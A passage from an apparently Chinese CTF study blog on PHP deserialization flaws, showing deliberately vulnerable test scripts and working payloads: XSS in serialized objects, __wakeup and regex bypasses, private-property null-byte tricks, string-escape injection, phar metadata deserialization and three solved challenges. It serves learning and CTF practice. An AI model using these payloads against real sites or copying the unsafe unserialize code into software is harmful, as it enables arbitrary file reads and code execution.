unserialize($a);?&gt; 尝试构造序列化代码的时候插入xss 1234567891011&lt;?phpclass A&#123; var $test = &quot;&lt;img src=1 onerror=alert(1)&gt;&quot;; function __wakeup()&#123; echo $this-&gt;test; &#125;&#125;$c = new A();$c = serialize($c);echo $c;?&gt; 输出O:1:&quot;A&quot;:1:&#123;s:4:&quot;test&quot;;s:28:&quot;&lt;img src=1 onerror=alert(1)&gt;&quot;;&#125; O表示类型是object 1表示object对应的类的名字的长度为1 “A”表示类名 1表示对应变量的个数 s表示序列化后为字符串 4表示字符串的长度 “test&quot;表示表示变量名 s表示变量test的类型 28表示变量test的长度 &quot;&lt;img src=1 onerror=alert(1)&gt;&quot;表示变量test的值 如果__wakeup中不是echo()，而是eval()，那么就是任意代码执行，危害就更大了。 wakeup绕过一个字符串或对象被序列化后，如果其属性被修改，则不会执行__wakeup()函数 例：在网站根目录下有两个文件flag.php和test.php test.php源码如下： 123456789101112131415161718192021222324252627&lt;?phpclass A&#123; public $file = __FILE__; function __construct($file)&#123; $this-&gt;file = $file; &#125; function __wakeup()&#123; if($this-&gt;file !== __FILE__)&#123; $this-&gt;file = __FILE__; &#125; &#125; function __destruct()&#123; highlight_file($this-&gt;file); &#125;&#125;if(isset($_REQUEST[&#x27;file&#x27;]))&#123; @unserialize($_REQUEST[&#x27;file&#x27;]);&#125;else&#123; highlight_file(__FILE__);&#125;?&gt; 构造序列化代码 1234567891011&lt;?phpclass A&#123; function __construct()&#123; $this-&gt;file = &quot;flag.php&quot;; &#125;&#125;$a = new A;$b = serialize($a);print_r($b);?&gt; 输出： 1O:1:&quot;A&quot;:1:&#123;s:4:&quot;file&quot;;s:8:&quot;flag.php&quot;;&#125; 如果直接进行正常的反序列化的话，即 http://127.0.0.1/test.php/?file=O:1:&quot;A&quot;:1:{s:4:&quot;file&quot;;s:8:&quot;flag.php&quot;;} 页面没有其它变化，因为在使用unserialize()的时候自动调用__wakeup，将file替换为当前路径 php在解析属性长度的时候，若是出错 将O:1:&quot;A&quot;:1:&#123;s:4:&quot;file&quot;;s:8:&quot;flag.php&quot;;&#125;改为 O:1:&quot;A&quot;:2:&#123;s:4:&quot;file&quot;;s:8:&quot;flag.php&quot;;&#125; 它并不会终止，而是继续执行，但不会调用__wakeup() 然后在销毁对象的时候自动调用__destruct()函数，高亮显示flag.php exp 1http:&#x2F;&#x2F;127.0.0.1&#x2F;test.php&#x2F;?file&#x3D;O:1:&quot;A&quot;:2:&#123;s:4:&quot;file&quot;;s:8:&quot;flag.php&quot;;&#125; OC绕过对test.php进行修改 对传进来的file进行过滤 12345678910111213141516171819202122232425262728293031&lt;?phpclass A&#123; public $file = __FILE__; function __construct($file)&#123; $this-&gt;file = $file; &#125; function __wakeup()&#123; if($this-&gt;file !== __FILE__)&#123; $this-&gt;file = __FILE__; &#125; &#125; function __destruct()&#123; highlight_file($this-&gt;file); &#125;&#125;if(isset($_REQUEST[&#x27;file&#x27;]))&#123; $file = $_REQUEST[&#x27;file&#x27;]; if(preg_match(&#x27;/[OC]:\\d+:/i&#x27;, $file))&#123; die(&quot;hacking!!!&quot;); &#125; @unserialize($_REQUEST[&#x27;file&#x27;]);&#125;else&#123; highlight_file(__FILE__);&#125;?&gt; 正则表达式中对file进行了过滤 当遇到 字母O或C 加上:，再加上一段数字和:，后面的 i 表示不区分大小写 时，则die掉。 该正则表达式匹配的部分为：O:1: 若在中间插入一些字符，就可以让它匹配不完全，这样就可以绕过正则匹配 对于数字 1 来说，+1 和 1 时一样的，这样就可以绕过 但在URL传参中，会进行解码，会把加号（+）变成空格，所以应用+的URL编码：%2b代替 即： O:%2b1: exp 1http:&#x2F;&#x2F;127.0.0.1&#x2F;test.php&#x2F;?file&#x3D;O:%2b1:&quot;A&quot;:2:&#123;s:4:&quot;file&quot;;s:8:&quot;flag.php&quot;;&#125; 私有属性绕过php中的访问类型（public，private，protected） public 公有修饰符，类中的成员没有访问限制，所有外部成员都可以访问（读和写）这个类成员（包括成员属性和成员方法）。 private 私有修饰符，被定义为private的成员，对于同一个类里的所有成员是可见的，即没有访问限制；但对于该类的外部代码时不允许改变甚至读操作的，对于该类的子类，也不能访问private修饰的成员。 protected 保护成员修饰符，被修饰为protected的成员不能被该类的外部代码访问。但是对于该类的子类有访问权限，可以进行属性、方法的读及写操作。 public 表示全局，类内部外部子类都可以访问；private 表示私有的，只有本类内部可以使用；protected 表示受保护的，只有本类或子类或父类中可以访问； 123456789&lt;?phpclass test&#123; public $test1 = &quot;hello&quot; private $test2 = &quot;hello&quot;; protected $test3 = &quot;hello&quot;;&#125;$test = new test();echo serialize($test); ?&gt; test类定义了三个不同类型(公有，私有，保护)，但是值相同的字符串，序列化输出的值不相同 private属性序列化为：%00类名%00变量名，对于test2来说，序列化后的长度则变为11 protected属性序列化为：%00*%00变量名，对于test3来说，序列化后的长度则变为8 %00是不可见字符 对test.php继续进行修改 将public改为private 12345678910111213141516171819202122232425262728293031&lt;?phpclass A&#123; private $file = __FILE__; function __construct($file)&#123; $this-&gt;file = $file; &#125; function __wakeup()&#123; if($this-&gt;file !== __FILE__)&#123; $this-&gt;file = __FILE__; &#125; &#125; function __destruct()&#123; highlight_file($this-&gt;file); &#125;&#125;if(isset($_REQUEST[&#x27;file&#x27;]))&#123; $file = $_REQUEST[&#x27;file&#x27;]; if(preg_match(&#x27;/[OC]:\\d+:/i&#x27;, $file))&#123; die(&quot;hacking!!!&quot;); &#125; @unserialize($_REQUEST[&#x27;file&#x27;]);&#125;else&#123; highlight_file(__FILE__);&#125;?&gt; 序列化带private属性的file &#123;s:4:&quot;file&quot;;s:8:&quot;flag.php&quot;;&#125; 将file改为%00A%00file，对应的长度改为7 即： {s:7:”%00A%00file”;s:8:”flag.php”;} exp 1http:&#x2F;&#x2F;127.0.0.1&#x2F;test.php&#x2F;?file&#x3D;O:%2b1:&quot;A&quot;:2:&#123;s:7:&quot;%00A%00file&quot;;s:8:&quot;flag.php&quot;;&#125; 字符串逃逸在网站根目录下有两个文件，test.php和flag.php test.php源码如下： 123456789101112131415161718192021&lt;?phperror_reporting(255);class A&#123; public $filename = __FILE__; public function __destruct()&#123; highlight_file($this-&gt;filename); &#125;&#125;function waf($s)&#123; return preg_replace(&#x27;/flag/i&#x27;, &#x27;index&#x27;, $s);&#125;if(isset($_REQUEST[&#x27;x&#x27;]) &amp;&amp; is_string($_REQUEST[&#x27;x&#x27;]))&#123; $a = [ 0 =&gt; $_REQUEST[&#x27;x&#x27;], 1 =&gt; &quot;1&quot; ]; @unserialize(waf(serialize($a)));&#125;else&#123; new A();&#125;?&gt; 构造payload： 首先要有个&quot;;使前面的字符串闭合 接下来是常规的序列化后的数组元素 i:0;O:1:&quot;A&quot;:1:&#123;s:8:&quot;filename&quot;;s:8:&quot;flag.php&quot;;&#125; 但在waf()函数中，对序列化后的$a进行替换，所以将s改为S，将flag.php改为十六进制的\\66\\6C\\61\\67\\2E\\70\\68\\70，即 i:0;O:1:&quot;A&quot;:1:&#123;s:8:&quot;filename&quot;;S:8:&quot;\\66\\6C\\61\\67\\2E\\70\\68\\70&quot;;&#125; 最后再加上&#125;使前面数组a的&#123;闭合 所以合起来是 &quot;;i:0;O:1:&quot;A&quot;:1:&#123;s:8:&quot;filename&quot;;S:8:&quot;\\66\\6C\\61\\67\\2E\\70\\68\\70&quot;;&#125;&#125; 12345678&lt;?php$a = [ 0 =&gt; &#x27;&quot;;i:0;O:1:&quot;A&quot;:1:&#123;s:8:&quot;filename&quot;;S:8:&quot;\\66\\6C\\61\\67\\2E\\70\\68\\70&quot;;&#125;&#125;&#x27;, 1 =&gt; &#x27;1&#x27;];print_r(serialize($a));?&gt; 输出 a:2:&#123;i:0;s:65:&quot;&quot;;i:0;O:1:&quot;A&quot;:1:&#123;s:8:&quot;filename&quot;;S:8:&quot;\\66\\6C\\61\\67\\2E\\70\\68\\70&quot;;&#125;&#125;&quot;;i:1;s:1:&quot;1&quot;;&#125; 所以该段字符串有65个字符 利用waf()函数将flag替换为index会增加一个字符，构造65个flag 1python -c print(&#x27;flag&#x27;*65) 将输出结果和前面的字符串拼接在一起，得到payload 1flagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflag&quot;;i:0;O:1:&quot;A&quot;:1:&#123;s:8:&quot;filename&quot;;S:8:&quot;\\66\\6C\\61\\67\\2E\\70\\68\\70&quot;;&#125;&#125; 附： 验证payload是否正确 123456789101112131415&lt;?phpfunction waf($a)&#123; return preg_replace(&#x27;/flag/&#x27;, &#x27;index&#x27;, $a);&#125;$a = [ 0 =&gt; &#x27;flagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflag&quot;;i:0;O:1:&quot;A&quot;:1:&#123;s:8:&quot;filename&quot;;S:8:&quot;\\66\\6C\\61\\67\\2E\\70\\68\\70&quot;;&#125;&#125;&#x27;, 1 =&gt; &#x27;1&#x27;];print_r(waf(serialize($a)));echo &quot;&lt;br&gt;&quot;;print_r(unserialize(waf(serialize($a))));?&gt; 输出结果： 12345678910a:2:&#123;i:0;s:325:&quot;indexindexindexindexindexindexindexindexindexindexindexindexindexindexindexindexindexindexindexindexindexindexindexindexindexindexindexindexindexindexindexindexindexindexindexindexindexindexindexindexindexindexindexindexindexindexindexindexindexindexindexindexindexindexindexindexindexindexindexindexindexindexindexindexindex&quot;;i:0;O:1:&quot;A&quot;:1:&#123;s:8:&quot;filename&quot;;S:8:&quot;\\66\\6C\\61\\67\\2E\\70\\68\\70&quot;;&#125;&#125;&quot;;i:1;s:1:&quot;1&quot;;&#125;Array( [0] &#x3D;&gt; __PHP_Incomplete_Class Object ( [__PHP_Incomplete_Class_Name] &#x3D;&gt; A [filename] &#x3D;&gt; flag.php )) 1python -c &quot;print(len(&#x27;indexindexindexindexindexindexindexindexindexindexindexindexindexindexindexindexindexindexindexindexindexindexindexindexindexindexindexindexindexindexindexindexindexindexindexindexindexindexindexindexindexindexindexindexindexindexindexindexindexindexindexindexindexindexindexindexindexindexindexindexindexindexindexindexindex&#x27;))&quot; 输出：325 phar反序列化(不太懂phar反序列化怎么用，这部分摘自https://paper.seebug.org/680/) phar文件本质上是一种压缩文件，其中每个被压缩文件的权限、属性等信息都放在这部分。这部分还会以序列化的形式存储用户自定义的meta-data，这是上述攻击手法最核心的地方。 注意：要将php.ini中的phar.readonly选项设置为Off，否则无法生成phar文件。 1234567891011121314&lt;?php class TestObject &#123; &#125; @unlink(&quot;phar.phar&quot;); $phar = new Phar(&quot;phar.phar&quot;); //后缀名必须为phar $phar-&gt;startBuffering(); $phar-&gt;setStub(&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;); //设置stub $o = new TestObject(); $phar-&gt;setMetadata($o); //将自定义的meta-data存入manifest $phar-&gt;addFromString(&quot;test.txt&quot;, &quot;test&quot;); //添加要压缩的文件 //签名自动计算 $phar-&gt;stopBuffering();?&gt; 可以明显的看到meta-data是以序列化的形式存储的： 有序列化数据必然会有反序列化操作，php一大部分的文件系统函数在通过phar://伪协议解析phar文件时，都会将meta-data进行反序列化，测试后受影响的函数如下： phar_test1.php 12345678910&lt;?php class TestObject &#123; public function __destruct() &#123; echo &#x27;Destruct called&#x27;; &#125; &#125; $filename = &#x27;phar://phar.phar/test.txt&#x27;; file_get_contents($filename); ?&gt; 其他函数当然也是可行的： phar_test2.php 1234567891011&lt;?php class TestObject &#123; public function __destruct() &#123; echo &#x27;Destruct called&#x27;; &#125; &#125; $filename = &#x27;phar://phar.phar/a_random_string&#x27;; file_exists($filename); //...... ?&gt; 当文件系统函数的参数可控时，我们可以在不调用unserialize()的情况下进行反序列化操作，一些之前看起来“人畜无害”的函数也变得“暗藏杀机”，极大的拓展了攻击面。 题目unserialize11234567891011&lt;?php show_source(__FILE__); class XianZhi&#123; public $name; function __destruct()&#123; echo file_get_contents($this-&gt;name); &#125; &#125; unserialize($_GET[&#x27;a&#x27;]);?&gt; 构造序列化代码 12345678&lt;?phpclass XianZhi&#123; public $name = &#x27;/flag&#x27;;&#125;$a = new XianZhi();echo serialize($a);?&gt;//O:7:&quot;XianZhi&quot;:1:&#123;s:4:&quot;name&quot;;s:5:&quot;/flag&quot;;&#125; unserialize2OC绕过、wake up绕过 1234567891011121314151617181920212223242526272829303132&lt;?phpclass Demo &#123; private $file = &#x27;index.php&#x27;; public function __construct($file) &#123; $this-&gt;file = $file; &#125; function __destruct() &#123; echo @highlight_file($this-&gt;file, true); &#125; function __wakeup() &#123; if ($this-&gt;file != &#x27;index.php&#x27;) &#123; //the secret is in the f15g_1s_here.php $this-&gt;file = &#x27;index.php&#x27;; &#125; &#125;&#125;if (isset($_GET[&#x27;var&#x27;])) &#123; $var = base64_decode($_GET[&#x27;var&#x27;]); if (preg_match(&#x27;/[oc]:\\d+:/i&#x27;, $var)) &#123; die(&#x27;stop hacking!&#x27;); &#125; else &#123; @unserialize($var); &#125;&#125; else &#123; highlight_file(&quot;index.php&quot;);&#125;?&gt; 这里首先有两个要绕过的点 第一个点是__wakeup()，因为这里正常反序列化会写死$this-&gt;ﬁle属性为 index.php，但是php存在这么一个漏洞（CVE-2016-7124），当实际对象不等于反序列化的对象数时候会绕过wakeup()。 第二个点是正则匹配，这里的正则匹配的意思是如果在var变量中存在O/C:数字(O:数字或者C:数字这样的形式)就die掉，这里匹配的是O:4，直接使用+号当做空格即可绕过，即O:+4即可绕过。 构造序列化代码 123456789101112131415&lt;?phpclass Demo &#123; private $file = &#x27;index.php&#x27;; public function __construct($file) &#123; $this-&gt;file = $file; &#125;&#125;$a = new Demo(&#x27;f15g_1s_here.php&#x27;);$a = serialize($a).&quot;\\n&quot;;$a = str_replace(&#x27;O:4&#x27;,&#x27;O:+4&#x27;,$a);$a = str_replace(&#x27;:1:&#x27;,&#x27;:2:&#x27;,$a);echo base64_encode($a);?&gt;//TzorNDoiRGVtbyI6Mjp7czoxMDoiAERlbW8AZmlsZSI7czoxNjoiZjE1Z18xc19oZXJlLnBocCI7fQo= unserialize3私有属性绕过 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879&lt;?phphighlight_file(__FILE__);class FileHandler &#123; protected $op; protected $filename; protected $content; function __construct() &#123; $op = &quot;1&quot;; $filename = &quot;/tmp/tmpfile&quot;; $content = &quot;Hello World!&quot;; $this-&gt;process(); &#125; public function process() &#123; if($this-&gt;op == &quot;1&quot;) &#123; $this-&gt;write(); &#125; else if($this-&gt;op == &quot;2&quot;) &#123; $res = $this-&gt;read(); $this-&gt;output($res); &#125; else &#123; $this-&gt;output(&quot;Bad Hacker!&quot;); &#125; &#125; private function write() &#123; if(isset($this-&gt;filename) &amp;&amp; isset($this-&gt;content)) &#123; if(strlen((string)$this-&gt;content) &gt; 100) &#123; $this-&gt;output(&quot;Too long!&quot;); die(); &#125; $res = file_put_contents($this-&gt;filename, $this-&gt;content); if($res) $this-&gt;output(&quot;Successful!&quot;); else $this-&gt;output(&quot;Failed!&quot;); &#125; else &#123; $this-&gt;output(&quot;Failed!&quot;); &#125; &#125; private function read() &#123; $res = &quot;&quot;; if(isset($this-&gt;filename)) &#123; $res = file_get_contents($this-&gt;filename); &#125; return $res; &#125; private function output($s) &#123; echo &quot;[Result]: &lt;br&gt;&quot;; echo $s; &#125; function __destruct() &#123; if($this-&gt;op === &quot;2&quot;) $this-&gt;op = &quot;1&quot;; $this-&gt;content = &quot;&quot;; $this-&gt;process(); &#125;&#125;function is_valid($s) &#123; for($i = 0; $i &lt; strlen($s); $i++) if(!(ord($s[$i]) &gt;= 32 &amp;&amp; ord($s[$i]) &lt;= 125)) return false; return true;&#125;if(isset($_GET&#123;&#x27;str&#x27;&#125;)) &#123; $str = (string)$_GET[&#x27;str&#x27;]; if(is_valid($str)) &#123; $obj = unserialize($str); &#125;&#125; ord() 函数返回字符串的首个字符的 ASCII 值。 file_get_contents() 把整个文件读入一个字符串中。 要利用read()的file_get_contents()读取flag.php，即/flag 所以process()的$op==”2”，然后通过output()输出 1234567891011&lt;?phpclass FileHandler &#123; protected $op = 2; protected $filename = &quot;/flag&quot;; protected $content = &quot;Hello World!&quot;;&#125;$a = new FileHandler;$b = serialize($a);echo $b;?&gt; 把输出的$b适当修改，得到payload 1&#x2F;?str&#x3D;O:11:&quot;FileHandler&quot;:3:&#123;S:5:&quot;\\00*\\00op&quot;;i:2;S:11:&quot;\\00*\\00filename&quot;;s:5:&quot;&#x2F;flag&quot;;S:10:&quot;\\00*\\00content&quot;;s:12:&quot;Hello%20World!&quot;;&#125;","categories":[{"name":"信息安全","slug":"信息安全","permalink":"https://flag2020.top/categories/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8/"}],"tags":[{"name":"web","slug":"web","permalink":"https://flag2020.top/tags/web/"}]}],"categories":[{"name":"信息安全","slug":"信息安全","permalink":"https://flag2020.top/categories/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8/"},{"name":"比赛writeup","slug":"比赛writeup","permalink":"https://flag2020.top/categories/%E6%AF%94%E8%B5%9Bwriteup/"},{"name":"学习笔记","slug":"学习笔记","permalink":"https://flag2020.top/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"},{"name":"其它","slug":"其它","permalink":"https://flag2020.top/categories/%E5%85%B6%E5%AE%83/"}],"tags":[{"name":"misc","slug":"misc","permalink":"https://flag2020.top/tags/misc/"},{"name":"web","slug":"web","permalink":"https://flag2020.top/tags/web/"},{"name":"writeup","slug":"writeup","permalink":"https://flag2020.top/tags/writeup/"},{"name":"学习笔记","slug":"学习笔记","permalink":"https://flag2020.top/tags/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"},{"name":"其它","slug":"其它","permalink":"https://flag2020.top/tags/%E5%85%B6%E5%AE%83/"}]}